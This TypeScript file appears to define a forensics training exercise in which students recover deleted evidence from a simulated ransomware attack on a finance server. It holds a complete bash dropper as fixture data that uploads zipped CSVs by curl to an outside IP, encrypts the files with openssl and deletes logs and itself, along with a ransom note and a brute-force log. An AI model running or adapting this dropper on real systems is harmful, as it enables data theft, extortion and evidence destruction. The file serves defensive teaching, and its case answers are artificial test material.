import { concat, te } from '../fs/bytes'
import { jpegWithExif, zip } from '../fs/formats'
import { wallpaperJpg } from '../fs/fixtures'
import type { Case } from './index'

const IP = '185.220.101.47'

/** Deterministic noise standing in for ciphertext. */
function ciphertext(seed: number, n: number) {
  const out = new Uint8Array(n)
  let x = seed || 1
  for (let i = 0; i < n; i++) {
    x ^= x << 13; x ^= x >>> 17; x ^= x << 5
    out[i] = x & 0xff
  }
  return concat(te.encode('LCK1'), out)
}

const cron = (hh: string, mm: string, pid: number) =>
  `Jun  2 ${hh}:${mm}:01 fin-app-02 CRON[${pid}]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)\n` +
  `Jun  2 ${hh}:${mm}:01 fin-app-02 CRON[${pid}]: pam_unix(cron:session): session closed for user root\n`
const fail = (ts: string, port: number) => `Jun  2 ${ts} fin-app-02 sshd[${3100 + (port % 90)}]: Failed password for deploy from ${IP} port ${port} ssh2\n`

const authLog =
  cron('01', '00', 2011) + cron('01', '30', 2044) + cron('02', '00', 2090) +
  fail('02:10:14', 50122) + fail('02:10:52', 50188) + fail('02:11:37', 50231) + fail('02:12:20', 50307) +
  fail('02:13:05', 50399) + fail('02:13:58', 50466) +
  `Jun  2 02:14:09 fin-app-02 sshd[3187]: Accepted password for deploy from ${IP} port 51514 ssh2\n` +
  `Jun  2 02:14:09 fin-app-02 sshd[3187]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)\n` +
  `Jun  2 02:15:40 fin-app-02 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/bash\n`

const note = `!!! YOUR FILES HAVE BEEN ENCRYPTED !!!

All finance records on this server are locked with AES-256.
We also have a copy of your data. If you do not pay, it will be published.

Send 1.5 BTC to bc1q7x9lck4471axw0m3r4nsqz5t2d8v6hpy0e9kq
Contact: lck4471@proton.example   ID: LCK-4471-AX
`

const dropper = `#!/bin/bash
# upd.sh - "system update helper"
T=/tmp/.cache
cd /srv/finance || exit 1
date -u +"staged %Y-%m-%dT%H:%M:%SZ host=$(hostname)" > $T/manifest.txt
zip -q $T/f.zip *.csv $T/manifest.txt
curl -s -T $T/f.zip http://${IP}:8080/drop/fin-app-02.zip
for f in *.csv; do
  openssl enc -aes-256-cbc -pass pass:$(cat /proc/sys/kernel/random/uuid) -in "$f" -out "$f.lck" && rm -f "$f"
done
cat > README_RESTORE.txt <<'EOT'
${note}EOT
rm -f /var/log/auth.log $T/f.zip "$0"
`


const payroll = `emp_id,name,iban,monthly_gross_eur
E-201,Lena Hoffmann,DE44500105175407324931,6420
E-202,Tomas Varga,DE12500105170648489890,5180
E-203,Aisha Bello,DE89370400440532013000,7350
E-204,Jonas Weber,DE02120300000000202051,4890
`
const vendors = `vendor_id,name,iban
V-11,Kessler Office Supply,DE75512108001245126199
V-12,Rhein Cloud GmbH,DE02100100100006820101
`

const syslog = [
  'Starting logrotate.service - Rotate log files...',
  'logrotate.service: Deactivated successfully.',
  'Finished logrotate.service - Rotate log files.',
  'Starting sysstat-collect.service - system activity accounting tool...',
  'sysstat-collect.service: Deactivated successfully.',
  'Finished sysstat-collect.service - system activity accounting tool.',
  'Starting apt-daily.service - Daily apt download activities...',
  'apt-daily.service: Deactivated successfully.',
  'Finished apt-daily.service - Daily apt download activities.',
].map((m) => `Jun  2 02:20:00 fin-app-02 systemd[1]: ${m}\n`).join('')

export const ransomware: Case = {
  id: 'ransomware',
  title: 'Locked Ledger',
  difficulty: 'Medium',
  label: 'FIN-APP-02',
  brief: [
    'At 07:30 on 2 June 2025 staff at Harlow & Finch found every CSV in /srv/finance on server fin-app-02 renamed to *.lck, next to a ransom note.',
    'The attackers say they stole the data before encrypting it. The auth log is missing and the dropper deleted itself.',
    'Work out how they got in, what they took, and whether the unencrypted payroll data can be recovered.',
  ],
  objectives: [
    'Recover the deleted auth log, the dropper script, the exfiltrated archive and the unencrypted payroll file.',
    'Rebuild the attack timeline, from initial access to ransom note.',
  ],
  ops: [
    { op: 'mkdir', path: '/var', t: '2025-01-15T09:00:00Z' },
    { op: 'mkdir', path: '/var/log', t: '2025-01-15T09:00:00Z' },
    { op: 'write', path: '/var/log/auth.log', t: '2025-06-02T02:15:40Z', data: authLog },
    { op: 'mkdir', path: '/var/www', t: '2025-01-15T09:00:00Z' },
    { op: 'mkdir', path: '/var/www/html', t: '2025-01-15T09:00:00Z' },
    { op: 'mkdir', path: '/srv', t: '2025-01-15T09:00:00Z' },
    { op: 'mkdir', path: '/srv/finance', t: '2025-01-15T09:00:00Z' },
    { op: 'mkdir', path: '/home', t: '2025-01-15T09:00:00Z' },
    { op: 'mkdir', path: '/home/deploy', t: '2025-01-15T09:05:00Z' },
    { op: 'mkdir', path: '/tmp', t: '2025-01-15T09:00:00Z' },
    { op: 'write', path: '/home/deploy/.profile', t: '2025-01-15T09:05:00Z', data: '# ~/.profile\nPATH="$HOME/bin:$PATH"\n' },
    { op: 'write', path: '/var/www/html/index.html', t: '2025-05-20T10:00:00Z', data: '<!doctype html><title>Harlow & Finch Portal</title><h1>Staff portal</h1>\n' },
    { op: 'write', path: '/var/www/html/old_index.html', t: '2025-02-03T10:00:00Z', data: '<!doctype html><title>Harlow & Finch</title><h1>Coming soon</h1>\n' },
    { op: 'delete', path: '/var/www/html/old_index.html', t: '2025-05-20T10:01:00Z' },
    { op: 'write', path: '/var/log/dpkg.log.1', t: '2025-05-25T06:25:00Z', data: '2025-05-25 06:24:51 status installed openssl:amd64 3.0.13-0ubuntu3.5\n2025-05-25 06:24:52 status installed libssl3:amd64 3.0.13-0ubuntu3.5\n' },
    { op: 'delete', path: '/var/log/dpkg.log.1', t: '2025-06-01T06:25:00Z' },
    { op: 'write', path: '/srv/finance/vendors.csv', t: '2025-05-28T14:10:00Z', data: vendors },
    { op: 'write', path: '/srv/finance/payroll_2025.csv', t: '2025-05-30T16:45:00Z', data: payroll },
    { op: 'write', path: '/srv/finance/.~lock.vendors.csv#', t: '2025-05-30T16:50:00Z', data: ',hfinch,fin-app-02,30.05.2025 16:50,file:///home/hfinch/.config/libreoffice/4;\n', hidden: true },
    { op: 'mkdir', path: '/tmp/.cache', t: '2025-06-02T02:16:20Z' },
    { op: 'write', path: '/tmp/.cache/upd.sh', t: '2025-06-02T02:16:30Z', data: dropper },
    { op: 'write', path: '/tmp/.cache/manifest.txt', t: '2025-06-02T02:17:10Z', data: 'staged 2025-06-02T02:17:10Z host=fin-app-02\n' },
    { op: 'write', path: '/tmp/.cache/f.zip', t: '2025-06-02T02:17:11Z', data: zip([{ name: 'payroll_2025.csv', data: payroll, mtime: '2025-05-30 16:45:00' }, { name: 'vendors.csv', data: vendors, mtime: '2025-05-28 14:10:00' }, { name: 'manifest.txt', data: 'staged 2025-06-02T02:17:10Z host=fin-app-02\n', mtime: '2025-06-02 02:17:10' }]) },
    { op: 'write', path: '/srv/finance/payroll_2025.csv.lck', t: '2025-06-02T02:17:40Z', data: ciphertext(0x4471, payroll.length + 16) },
    { op: 'delete', path: '/srv/finance/payroll_2025.csv', t: '2025-06-02T02:17:41Z' },
    { op: 'write', path: '/srv/finance/vendors.csv.lck', t: '2025-06-02T02:17:42Z', data: ciphertext(0x1147, vendors.length + 16) },
    { op: 'delete', path: '/srv/finance/vendors.csv', t: '2025-06-02T02:17:43Z' },
    { op: 'write', path: '/srv/finance/README_RESTORE.txt', t: '2025-06-02T02:18:05Z', data: note },
    { op: 'write', path: '/srv/finance/READ_ME.jpg', t: '2025-06-02T02:18:06Z', data: jpegWithExif(wallpaperJpg, { make: 'LCK', model: 'builder', dateTimeOriginal: '2025:05:11 20:02:44' }) },
    { op: 'delete', path: '/var/log/auth.log', t: '2025-06-02T02:18:30Z' },
    { op: 'wipe', path: '/tmp/.cache/f.zip', t: '2025-06-02T02:18:30Z' },
    { op: 'delete', path: '/tmp/.cache/manifest.txt', t: '2025-06-02T02:18:30Z' },
    { op: 'delete', path: '/tmp/.cache/upd.sh', t: '2025-06-02T02:18:31Z' },
    // Normal system activity after the attack reuses the freed blocks at the start of the old auth.log.
    { op: 'write', path: '/var/log/syslog.1', t: '2025-06-02T02:20:00Z', reuse: true, data: syslog },
  ],
  evidence: [
    { id: 'auth', label: 'auth.log (deleted, partly overwritten)', find: { path: '/var/log/auth.log' }, event: `SSH brute force succeeds: "Accepted password for deploy from ${IP}"`, t: '2025-06-02T02:14:09Z', timeSource: 'The "Accepted password" line inside the recovered log. The inode times only show when the log was last written', why: 'Initial access: weak password on the deploy account, brute-forced from a Tor exit node.' },
    { id: 'dropper', label: 'upd.sh dropper (deleted)', find: { path: '/tmp/.cache/upd.sh' }, event: 'Dropper script upd.sh lands in the hidden /tmp/.cache directory', t: '2025-06-02T02:16:30Z', timeSource: 'Inode birth time of the deleted script', why: 'Shows the attacker\'s whole playbook: stage, exfiltrate, encrypt, delete evidence.' },
    { id: 'exfil', label: 'f.zip exfil archive (carved)', find: { carve: '/tmp/.cache/f.zip' }, event: 'Finance data zipped for exfiltration (double extortion)', t: '2025-06-02T02:17:10Z', timeSource: 'Carved files have no inode. Use the manifest.txt entry time inside the zip (unzip -l). The server clock is UTC', why: 'Proves the data was stolen, not only encrypted, which triggers breach notification.' },
    { id: 'plain', label: 'payroll_2025.csv (deleted plaintext)', find: { path: '/srv/finance/payroll_2025.csv' }, event: 'Original payroll_2025.csv deleted after encryption', t: '2025-06-02T02:17:41Z', timeSource: 'C (change) time of the deleted inode, which is the moment it was unlinked', why: 'The ransomware only unlinked the original, so the plaintext is fully recoverable without paying.' },
    { id: 'note', label: 'README_RESTORE.txt', find: { path: '/srv/finance/README_RESTORE.txt' }, event: 'Ransom note dropped', t: '2025-06-02T02:18:05Z', timeSource: 'Inode birth time', why: 'Holds the BTC wallet and contact details for threat-intel correlation.' },
  ],
  decoys: [
    { label: 'old_index.html (deleted)', find: { path: '/var/www/html/old_index.html' }, why: 'Deleted two weeks earlier during a normal site update.' },
    { label: 'dpkg.log.1 (deleted)', find: { path: '/var/log/dpkg.log.1' }, why: 'Removed by routine logrotate on 1 June, the day before the attack.' },
    { label: '.~lock.vendors.csv# (hidden)', find: { path: '/srv/finance/.~lock.vendors.csv#' }, why: 'A LibreOffice lock file left by a staff member on 30 May.' },
  ],
  hints: [
    'Start with `fls -r -d /`. The attacker hid their tools in a dot-directory under /tmp.',
    'The recovered auth.log starts with junk. `istat` shows some of its blocks now belong to another file. Read what survives with `strings`.',
    'Some files lose their inode entirely. `carve` scans unallocated space for file signatures (PK.., %PDF, JPEG) and needs no metadata.',
    'Carved files have no timestamps of their own. `unzip -l` shows the times stored inside the archive.',
    'To time a deletion, look at the C (change) time of the deleted inode, not M.',
  ],
}
